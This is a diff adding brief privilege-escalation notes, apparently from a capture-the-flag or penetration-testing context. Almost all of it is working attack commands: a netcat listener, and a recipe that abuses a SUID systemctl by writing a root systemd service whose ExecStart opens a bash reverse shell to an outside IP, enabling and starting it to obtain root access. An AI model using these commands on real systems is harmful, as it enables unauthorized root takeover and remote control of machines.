@@ -1,0 +1,29 @@
+Listen the port:
+nc -lvnp 1234
+
+Exec the shell and get access
+
+----------------------------------
+Examples:
+SUID servicectl
+
+echo '
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.8.209.17/9999 0>&1"
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service
+
+/bin/systemctl enable /tmp/root.service
+
+//host machine
+nc -lvnp 9999
+
+// target machine
+/bin/systemctl start root
+
+// root access
